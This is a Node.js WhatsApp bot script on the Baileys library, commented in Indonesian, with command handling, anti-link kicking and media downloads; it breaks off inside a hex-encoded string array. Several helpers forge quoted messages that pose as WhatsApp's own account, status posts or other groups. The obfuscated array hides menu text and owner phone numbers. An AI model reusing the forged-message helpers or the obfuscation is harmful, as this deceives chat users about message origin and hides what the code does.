/* 
  * GAK SUB = EROR
  * CREDIT FOR ME -> SUBSCRIBE + 🔔 ITU AJA  || SUBSCRIBE FOR MORE UPDATE
  * EDIT SEMUANYA DI SETTING.JSON
  * ADA FITUR YG BELUM SEMPAT GUA FIX GARA² SINYAL LEMOT
  * KLO NGEDIT YG TELITI SAYANG, EROR? DOWNLOAD ULANG SC NYA
*/
const
	{
		WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		WA_DEFAULT_EPHEMERAL,
		ReconnectMode,
		ProxyAgent,
		GroupSettingChange,
		waChatKey,
		mentionedJid,
		processTime,
	} = require("@adiwajshing/baileys")
const qrcode = require("qrcode-terminal")
const moment = require("moment-timezone")
const speed = require('performance-now')
const request = require('request');
const { spawn, exec, execSync } = require("child_process")
const fs = require("fs")
const axios = require("axios")
const ffmpeg = require('fluent-ffmpeg')
const { EmojiAPI } = require("emoji-api");
const tik = require('tiktok-scraper-without-watermark')
const ig = require('insta-fetcher')
const emoji = new EmojiAPI()
const fetch = require('node-fetch');
const Fb = require('fb-video-downloader');
const twitterGetUrl = require("twitter-url-direct")
const phoneNum = require('awesome-phonenumber')
const gis = require('g-i-s');
const got = require("got");
const imageToBase64 = require('image-to-base64');
const ID3Writer = require('browser-id3-writer');		
const brainly = require('brainly-scraper')
const yts = require( 'yt-search')
const ms = require('parse-ms')
const toMs = require('ms')
const setting = JSON.parse(fs.readFileSync('./settings.json'))
const antilink = JSON.parse(fs.readFileSync('./src/antilink.json'))
const welkom = JSON.parse(fs.readFileSync('./src/welkom.json'))
let filter = JSON.parse(fs.readFileSync('./src/filter.json'))
const sfilter = JSON.parse(fs.readFileSync('./src/sfilter.json'))
const gcdetect = JSON.parse(fs.readFileSync('./src/gcdetect.json'))
const { error } = require("qrcode-terminal")
const { getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, close } = require('./lib/functions')
const { color, bgcolor } = require('./lib/color')
const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetcher')
const { yta, ytv, igdl, upload } = require('./lib/ytdl')
const { webp2mp4File} = require('./lib/webp2mp4')
const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
const afk = JSON.parse(fs.readFileSync('./lib/off.json'))
const { sleep, isAfk, cekafk, addafk } = require('./lib/offline')

thumb = setting.thumb
fthumb = setting.fakethumb
hit_today = []
blocked = []
prefix = setting.prefix
banChats = true
offline = false
targetpc = setting.ownerNumber
owner = setting.ownerNumber
ownerr ='+62887435047326'
fake = setting.fake
numbernye = '0'
waktu = '-'
alasan = '-'
cr = setting.cr
petik = '```'
msgId="B826873620DD5947E683E3ABE663F263"
//=================================================//
module.exports = alpha = async (alpha, mek) => {
	try {
        if (!mek.hasNewMessage) return
        mek = mek.messages.all()[0]
		if (!mek.message) return
		if (mek.key && mek.key.remoteJid == 'status@broadcast') return
		global.blocked
        mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
        const content = JSON.stringify(mek.message)
		const from = mek.key.remoteJid
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
        const type = Object.keys(mek.message)[0]
        //const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
        //const prefix = /^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*@,;]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*,;]/gi) : '-'          	
        body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : ''
		budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
		const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
		const command = body.slice(0).trim().split(/ +/).shift().toLowerCase()		
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const q = args.join(' ')
		const botNumber = alpha.user.jid
		const botNumberss = alpha.user.jid + '@c.us'
		const isGroup = from.endsWith('@g.us')
		let sender = isGroup ? mek.participant : mek.key.remoteJid
		const timi = moment.tz('Asia/Jakarta').add(30, 'days').calendar();
		const timu = moment.tz('Asia/Jakarta').add(20, 'days').calendar();
		const wita = moment.tz('Asia/Makassar').format('HH:mm:ss')
		const wit = moment.tz('Asia/Jayapura').format('HH:mm:ss')
		const totalchat = await alpha.chats.all()
		const groupMetadata = isGroup ? await alpha.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
		const isWelkom = isGroup ? welkom.includes(from) : false
		const isAntiLink = isGroup ? antilink.includes(from) : false
		const ratee = ["100","101","102","103","104","105","106","107","108","109","110","111","112","113","114","115","116","117","118","119","120"]
        const tee = ratee[Math.floor(Math.random() * ratee.length)]
        const tescuk = ["0@s.whatsapp.net"]
        const conts = mek.key.fromMe ? alpha.user.jid : alpha.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = mek.key.fromMe ? alpha.user.name : conts.notify || conts.vname || conts.name || '-'
        const timuu = moment.tz('Asia/Jakarta').format('HH:mm:ss')
			const hariRaya = new Date('Jan 12, 2022 07:00:00')
			const sekarang = new Date().getTime();
			const Selisih = hariRaya - sekarang;
			const jhari = Math.floor( Selisih / (1000 * 60 * 60 * 24));
			const jjam = Math.floor( Selisih % (1000 * 60 * 60 * 24) / (1000 * 60 * 60))
			const mmmenit = Math.floor( Selisih % (1000 * 60 * 60) / (1000 * 60));
			const ddetik = Math.floor( Selisih % (1000 * 60) / 1000);
			const ultah = `${jhari}Hari ${jjam}Jam ${mmmenit}Menit ${ddetik}Detik`
			var date = new Date();
        var tahun = date.getFullYear();
        var bulan1 = date.getMonth();
        var tanggal = date.getDate();
        var hari = date.getDay();
        var jam = date.getHours();
        var menit = date.getMinutes();
        var detik = date.getSeconds();
        var waktoo = date.getHours();
            switch(hari) {
                case 0: hari = "Minggu"; break;
                case 1: hari = "Senin"; break;
                case 2: hari = "Selasa"; break;
                case 3: hari = "Rabu"; break;
                case 4: hari = "Kamis"; break;
                case 5: hari = "Jum`at"; break;
                case 6: hari = "Sabtu"; break;
            }
            switch(bulan1) {
                case 0: bulan1 = "Januari"; break;
                case 1: bulan1 = "Februari"; break;
                case 2: bulan1 = "Maret"; break;
                case 3: bulan1 = "April"; break;
                case 4: bulan1 = "Mei"; break;
                case 5: bulan1 = "Juni"; break;
                case 6: bulan1 = "Juli"; break;
                case 7: bulan1 = "Agustus"; break;
                case 8: bulan1 = "September"; break;
                case 9: bulan1 = "Oktober"; break;
                case 10: bulan1 = "November"; break;
                case 11: bulan1 = "Desember"; break;
            }
            var tampilTanggal = "" + hari + ", " + tanggal + " " + bulan1 + " " + tahun;
            var tampilWaktu = "" + jam + ":" + menit + ":" + detik ;   
            var ase = new Date();
            var waktoo = ase.getHours();
            switch(waktoo){
                case 0: waktoo = "Selamat Malam 🌚"; break;
                case 1: waktoo = "Selamat Malam 🌚"; break;
                case 2: waktoo = "Selamat Malam 🌚"; break;
                case 3: waktoo = "Selamat Malam 🌚"; break;
                case 4: waktoo = "Selamat Pagi 🌞"; break;
                case 5: waktoo = "Selamat Pagi 🌞"; break;
                case 6: waktoo = "Selamat Pagi 🌞"; break;
                case 7: waktoo = "Selamat Pagi 🌞"; break;
                case 8: waktoo = "Selamat Pagi 🌞"; break;
                case 9: waktoo = "Selamat Pagi 🌞"; break;
                case 10: waktoo = "Selamat Pagi 🌞"; break;
                case 11: waktoo = "Waktu Dzuhur , jangan lupa shalat"; break;
                case 12: waktoo = "Selamat Siang ☀️"; break;
                case 13: waktoo = "Selamat Siang ☀️"; break;
                case 14: waktoo = "Waktu Ashar , jangan lupa shalat"; break;
                case 15: waktoo = "Selamat Sore 🌌"; break;
                case 16: waktoo = "Selamat Sore 🌌"; break;
                case 17: waktoo = "Selamat Sore 🌌"; break;
                case 18: waktoo = "Waktu Magrib, jangan lupa shalat"; break;
                case 19: waktoo = "Waktu Isya, jangan lupa shalat"; break;
                case 20: waktoo = "Selamat Malam 🌃"; break;
                case 21: waktoo = "Selamat Malam 🌃"; break;
                case 22: waktoo = "Selamat Malam 🌃"; break;
                case 23: waktoo = "Selamat Malam 🌃"; break;
            }
            var hahh = "" + waktoo;      
		mess = {
			wait: 'BENTAR',
			success: 'Berhasil!',
			wrongFormat: 'Format salah, coba liat lagi di menu',
			error: {
				stick: 'Itu bukan stiker',
				Iv: 'Linknya error:v'
			},
			only: {
				group: 'Only Group',
			}
		}
		const isUrl = (url) => {
        return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
        }

        const reply = (teks) => {
            alpha.sendMessage(from, teks, text, {quoted:mek})
        }

        const sendMess = (hehe, teks) => {
            alpha.sendMessage(hehe, teks, text)
        }

        const mentions = (teks, memberr, id) => {
            (id == null || id == undefined || id == false) ? alpha.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : alpha.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": memberr } })
        }

        const fakestatus = (teks) => {
            alpha.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync(`image/${thumb}`),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true
            })
        }
        const fakethumb = (teks, yes) => {
            alpha.sendMessage(from, teks, image, {thumbnail:fs.readFileSync(`./image/${fthumb}`),quoted:mek,caption:yes})
        }
        const fakegroup = (teks) => {
            alpha.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync(`./image/${thumb}`),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true
            })
        }
        const ftroli ={"key": {   "fromMe": false,"participant":"0@s.whatsapp.net",   "remoteJid": "0@s.whatsapp.net"  }, "message": {orderMessage: {itemCount: 10,status: 200, thumbnail: fs.readFileSync('image/100.jpg'), surface: 200, message: `‣ Name : ${setting.botname}\n‣ Owner : ${setting.ownername}`, orderTitle: 'zeeoneofc', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
const fgclink = (teks) => {

            alpha.sendMessage(from, teks, text, {

  quoted: {

	key: {

		fromMe: false,

		participant: "0@s.whatsapp.net",

		remoteJid: "0@s.whatsapp.net"

	},

	message: {

		"groupInviteMessage": {

			"groupJid": "6288213840883-1616169743@g.us",

			"inviteCode": "mememteeeekkeke",

			"groupName": "Alphabot", 

            "caption": `${hahh} ${pushname}`, 

            'jpegThumbnail': fs.readFileSync(`image/${thumb}`)

		}

	}

}

            })

        }

const fvideo  = (teks) => {

            alpha.sendMessage(from, teks, text, {

  quoted: {

	   key: { 

          fromMe: false,

	      participant: `0@s.whatsapp.net`, ...(from ? 

	 { remoteJid: "6289643739077-1613049930@g.us" } : {}) 

                },

	 message: { 

                 "videoMessage": { 

                 "title":"ONE DEV",

                 "h": `Hmm`,

                 'seconds': '99999', 

                 'caption': `${hahh} ${pushname}`,

                 'jpegThumbnail': fs.readFileSync(`image/${thumb}`)

                        }

                       }

	                  }

})

			}
        const fakeitem = (teks) => {
            alpha.sendMessage(from, teks, text, {
                quoted: {
        key:{
        	fromMe:false,
        participant:`0@s.whatsapp.net`, ...(from ? {
remoteJid :"6289523258649-1604595598@g.us" }: {})
                    },message:{"orderMessage":{"orderId":"174238614569481","thumbnail":fs.readFileSync(`image/${thumb}`),"itemCount":10,"status":"INQUIRY","surface":"CATALOG","message":`${setting.botname}`,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true})}
           const fakedoc = (teks) => {  
 alpha.sendMessage(from, teks, text, { contextInfo: {mentionedJid: [sender]}, quoted: { "key": { "participant": `${numbernye}@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumb}`), "mimetype": "application/octet-stream","title": "YT : ZEEONE OFC", "fileLength": "36", "pageCount": 0, "fileName": `Alphabot.zip`}}, "messageTimestamp": "1614069378", "status": "PENDING"}})}
		const fkontak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `6283136505591-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${cr}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${cr},;;;\nFN:${cr},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync(`image/${thumb}`), thumbnail: fs.readFileSync(`image/${thumb}`),sendEphemeral: true}}}  
 const zeeoneuhuy = (pesan, tipe, target, target2) => {
		    alpha.sendMessage(from, pesan, tipe, { "contextInfo": {mentionedJid: [sender], "forwardingScore": 999,"isForwarded": true}, quoted: { "key": { "participant": `${target}`, "remoteJid": "393470602054-1351628616@g.us", "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumb}`), "mimetype": "application/octet-stream", "title": `${target2}`, "fileLength": "36", "pageCount": 0, "fileName": `${target2}` }}, "messageTimestamp": "1614069378", "status": "PENDING"}})
		    }
const fdoc = {quoted: { key : { participant : `0@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumb}`), "mimetype": "application/octet-stream","title": `${setting.fake}`, "fileLength": "36", "pageCount": 0, "fileName": `${setting.fake}`}}, "messageTimestamp": "1614069378", "status": "PENDING"}}

if (messagesC.includes("://chat.whatsapp.com/")){
		if (!isGroup) return
		if (!isAntiLink) return
		if (isGroupAdmins) return fakestatus('karena kamu adalah admin group, bot tidak akan kick kamu')
		alpha.updatePresence(from, Presence.composing)
		if (messagesC.includes("#izinadmin")) return fakestatus("#izinadmin diterima")
		var kic = `${sender.split("@")[0]}`
		fakestatus(`Link Group Terdeteksi maaf ${sender.split("@")[0]} anda akan di kick dari group`)
		setTimeout( () => {
			alpha.groupRemove(from, [kic]).catch((e)=>{alpha.sendMessage(from, `*ERR:* ${e}`, text,{quoted:mek})})
		}, 5000)
		setTimeout( () => {
			alpha.updatePresence(from, Presence.composing)
			fakestatus("1detik")
		}, 4000)
		setTimeout( () => {
			alpha.updatePresence(from, Presence.composing)
			fakestatus("2detik")
		}, 3000)
		setTimeout( () => {
			alpha.updatePresence(from, Presence.composing)
			fakestatus("3detik")
		}, 2000)
		setTimeout( () => {
			alpha.updatePresence(from, Presence.composing)
			fakestatus("4detik")
		}, 1000)
		setTimeout( () => {
			alpha.updatePresence(from, Presence.composing)
			fakestatus("5detik")
		}, 0)
	}
	              
        const sendStickerFromUrl = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './stik' + names + '.png', async function () {
                    console.log('selesai');
                    let filess = './stik' + names + '.png'
                    let asw = './stik' + names + '.webp'
                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        let media = fs.readFileSync(asw)
                        alpha.sendMessage(to, media, MessageType.sticker,{quoted:mek})
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                    });
                });
            }
        const sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    alpha.sendMessage(to, media, type, { quoted: mek, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            } 
        var _0x26ef=["\x73\x74\x69\x63\x6B\x65\x72\x4D\x65\x73\x73\x61\x67\x65","\x6D\x65\x73\x73\x61\x67\x65","\x66\x69\x6C\x65\x4C\x65\x6E\x67\x74\x68","\x6E\x65\x6F\x66\x65\x74\x63\x68\x20\x2D\x2D\x73\x74\x64\x6F\x75\x74","\x75\x74\x66\x2D\x38","\x52\x61\x6D\x3A","\x72\x65\x70\x6C\x61\x63\x65","\x2A","\x53\x70\x65\x65\x64\x3A\x20","\x74\x6F\x46\x69\x78\x65\x64","\x20\x53\x65\x63\x6F\x6E\x64\x2A","\x75\x70\x74\x69\x6D\x65","","\x4A\x61\x6E\x75\x61\x72\x69","\x46\x65\x62\x72\x75\x61\x72\x69","\x4D\x61\x72\x65\x74","\x41\x70\x72\x69\x6C","\x4D\x65\x69","\x4A\x75\x6E\x69","\x4A\x75\x6C\x69","\x41\x67\x75\x73\x74\x75\x73","\x53\x65\x70\x74\x65\x6D\x62\x65\x72","\x4F\x6B\x74\x6F\x62\x65\x72","\x4E\x6F\x76\x65\x6D\x62\x65\x72","\x44\x65\x73\x65\x6D\x62\x65\x72","\x4D\x69\x6E\x67\x67\x75","\x53\x65\x6E\x69\x6E","\x53\x65\x6C\x61\x73\x61","\x52\x61\x62\x75","\x4B\x61\x6D\x69\x73","\x4A\x75\x6D\x27\x61\x74","\x53\x61\x62\x74\x75","\x67\x65\x74\x53\x65\x63\x6F\x6E\x64\x73","\x67\x65\x74\x4D\x69\x6E\x75\x74\x65\x73","\x67\x65\x74\x48\x6F\x75\x72\x73","\x50\x4D","\x41\x4D","\x67\x65\x74\x44\x61\x74\x65","\x67\x65\x74\x4D\x6F\x6E\x74\x68","\x67\x65\x74\x44\x61\x79","\x67\x65\x74\x59\x65\x61\x72","\x2C\x20","\x20\x2D\x20","\x69\x6D\x61\x67\x65\x2F","\x72\x65\x61\x64\x46\x69\x6C\x65\x53\x79\x6E\x63","\x36\x32\x38\x38\x37\x34\x33\x35\x30\x34\x37\x33\x32\x36\x40\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74","\x30\x40\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74","\x36\x32\x38\x38\x32\x37\x39\x35\x37\x35\x35\x31\x33\x40\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74","\x36\x32\x38\x35\x37\x31\x36\x33\x36\x30\x35\x31\x32\x40\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74","\u2501\u2501\x20\u2772\x20\x2A\x53\x49\x4D\x50\x4C\x45\x20\x42\x4F\x54\x20\x57\x45\x41\x2A\x20\u2773\x20\u2501\u2501\x0D\x0A","\x20","\x0D\x0A\x0D\x0A\u25EF\x20\x2A\x4E\x45\x57\x20\x59\x45\x41\x52\x2A\x20\uD83C\uDF8A\x0D\x0A\x2A","\x2A\x0D\x0A\x0D\x0A\u25EF\x20\x2A\x49\x4E\x46\x4F\x52\x4D\x41\x54\x49\x4F\x4E\x2A\x0D\x0A","\u2937\x20\x41\x75\x74\x68\x6F\x72\x20\x3A\x20\x40","\x40","\x73\x70\x6C\x69\x74","\x0D\x0A\u2937\x20\x4F\x77\x6E\x65\x72\x20\x3A\x20","\x6F\x77\x6E\x65\x72\x6E\x61\x6D\x65","\x0D\x0A\u2937\x20\x42\x6F\x74\x20\x4E\x61\x6D\x65\x20\x3A\x20","\x62\x6F\x74\x6E\x61\x6D\x65","\x0D\x0A\u2937\x20\x50\x72\x65\x66\x69\x78\x20\x3A\x20\x5B\x20","\x20\x5D\x0D\x0A\u2937\x20\x44\x61\x74\x65\x20\x3A\x20","\x2C","\x0D\x0A\u2937\x20\x54\x69\x6D\x65\x20\x3A\x20","\x20\x20\x57\x49\x42","\x0D\x0A\x0D\x0A\x2A\x4C\x49\x53\x54\x20\x4D\x45\x4E\x55\x2A\x0D\x0A","\u2752\x20","\x63\x6F\x6E\x76\x65\x72\x74\x6D\x65\x6E\x75\x0D\x0A\u2752\x20","\x64\x6F\x77\x6E\x6C\x6F\x61\x64\x6D\x65\x6E\x75\x0D\x0A\u2752\x20","\x66\x75\x6E\x6D\x65\x6E\x75\x0D\x0A\u2752\x20","\x6D\x61\x6B\x65\x72\x6D\x65\x6E\x75\x0D\x0A\u2752\x20","\x6F\x74\x68\x65\x72\x6D\x65\x6E\x75\x0D\x0A\u2752\x20","\x6F\x77\x6E\x65\x72\x6D\x65\x6E\x75\x0D\x0A\u2752\x20","\x73\x74\x6F\x72\x61\x67\x65\x6D\x65\x6E\x75\x0D\x0A\u2752\x20","\x74\x61\x67\x6D\x65\x6E\x75\x0D\x0A\u2752\x20","\x75\x70\x6D\x65\x6E\x75","\x0D\x0A\x0D\x0A\x2A\x41\x42\x4F\x55\x54\x2A\x0D\x0A","\x73\x6F\x75\x72\x63\x65\x0D\x0A\u2752\x20","\x6D\x79\x73\x74\x61\x74\x0D\x0A\u2752\x20","\x73\x70\x65\x65\x64\x0D\x0A\u2752\x20","\x73\x74\x61\x74\x75\x73\x0D\x0A\u2752\x20","\x72\x75\x6E\x74\x69\x6D\x65","\x0D\x0A\x0D\x0A\x2A\x54\x51\x54\x4F\x2A\x0D\x0A\u2022\x20\x40","\x0D\x0A\u2022\x20\x40","\x0D\x0A\x0D\x0A\x2A\x53\x50\x4F\x4E\x53\x4F\x52\x45\x44\x20\x42\x59\x2A\x0D\x0A\u2022\x20\x40","\x0D\x0A\x0D\x0A\u2501\u2501\x20\u2772\x20\x2A\x53\x49\x4D\x50\x4C\x45\x20\x42\x4F\x54\x20\x57\x45\x41\x2A\x20\u2773\x20\u2501\u2501\x20\x0D\x0A","\x73\x65\x6E\x64\x4D\x65\x73\x73\x61\x67\x65","\x66\x72\x6F\x6D\x4D\x65","\x6B\x65\x79","\x60\x60\x60\x4F\x57\x4E\x45\x52\x20\x4F\x4E\x4C\x59\x60\x60\x60","\u300C\x20\x2A\x53\x45\x4C\x46\x2D\x4D\x4F\x44\x45\x2A\x20\u300D","\u300C\x20\x2A\x50\x55\x42\x4C\x49\x43\x2D\x4D\x4F\x44\x45\x2A\x20\u300D","\x69\x6D\x61\x67\x65\x4D\x65\x73\x73\x61\x67\x65","\x76\x69\x64\x65\x6F\x4D\x65\x73\x73\x61\x67\x65","\x69\x6E\x63\x6C\x75\x64\x65\x73","\x6C\x65\x6E\x67\x74\x68","\x63\x6F\x6E\x74\x65\x78\x74\x49\x6E\x66\x6F","\x71\x75\x6F\x74\x65\x64\x4D","\x6D","\x73\x74\x72\x69\x6E\x67\x69\x66\x79","\x70\x61\x72\x73\x65","\x64\x6F\x77\x6E\x6C\x6F\x61\x64\x41\x6E\x64\x53\x61\x76\x65\x4D\x65\x64\x69\x61\x4D\x65\x73\x73\x61\x67\x65","\x36\x36\x36\x2E\x77\x65\x62\x70","\x73\x61\x76\x65","\x77\x65\x62\x70","\x74\x6F\x46\x6F\x72\x6D\x61\x74","\x2D\x76\x63\x6F\x64\x65\x63","\x6C\x69\x62\x77\x65\x62\x70","\x2D\x76\x66","\x73\x63\x61\x6C\x65\x3D\x27\x6D\x69\x6E\x28\x33\x32\x30\x2C\x69\x77\x29\x27\x3A\x6D\x69\x6E\x27\x28\x33\x32\x30\x2C\x69\x68\x29\x27\x3A\x66\x6F\x72\x63\x65\x5F\x6F\x72\x69\x67\x69\x6E\x61\x6C\x5F\x61\x73\x70\x65\x63\x74\x5F\x72\x61\x74\x69\x6F\x3D\x64\x65\x63\x72\x65\x61\x73\x65\x2C\x66\x70\x73\x3D\x31\x35\x2C\x20\x70\x61\x64\x3D\x33\x32\x30\x3A\x33\x32\x30\x3A\x2D\x31\x3A\x2D\x31\x3A\x63\x6F\x6C\x6F\x72\x3D\x77\x68\x69\x74\x65\x40\x30\x2E\x30\x2C\x20\x73\x70\x6C\x69\x74\x20\x5B\x61\x5D\x5B\x62\x5D\x3B\x20\x5B\x61\x5D\x20\x70\x61\x6C\x65\x74\x74\x65\x67\x65\x6E\x3D\x72\x65\x73\x65\x72\x76\x65\x5F\x74\x72\x61\x6E\x73\x70\x61\x72\x65\x6E\x74\x3D\x6F\x6E\x3A\x74\x72\x61\x6E\x73\x70\x61\x72\x65\x6E\x63\x79\x5F\x63\x6F\x6C\x6F\x72\x3D\x66\x66\x66\x66\x66\x66\x20\x5B\x70\x5D\x3B\x20\x5B\x62\x5D\x5B\x70\x5D\x20\x70\x61\x6C\x65\x74\x74\x65\x75\x73\x65","\x61\x64\x64\x4F\x75\x74\x70\x75\x74\x4F\x70\x74\x69\x6F\x6E\x73","\x65\x6E\x64","\x46\x69\x6E\x69\x73\x68","\x6C\x6F\x67","\x75\x6E\x6C\x69\x6E\x6B\x53\x79\x6E\x63","\x6F\x6E","\x65\x72\x72\x6F\x72","\x45\x72\x72\x6F\x72\x20\x3A\x20","\x73\x74\x61\x72\x74","\x53\x74\x61\x72\x74\x65\x64\x20\x3A\x20","\x69\x6E\x70\x75\x74","\x2E\x2F","\x73\x65\x63\x6F\x6E\x64\x73","\x71\x75\x6F\x74\x65\x64\x4D\x65\x73\x73\x61\x67\x65","\x39\x39\x39\x2E\x77\x65\x62\x70","\x77\x61\x69\x74","\x2E\x6D\x70\x34","\x65\x6E\x64\x73\x57\x69\x74\x68","\x76\x69\x64\x65\x6F","\x67\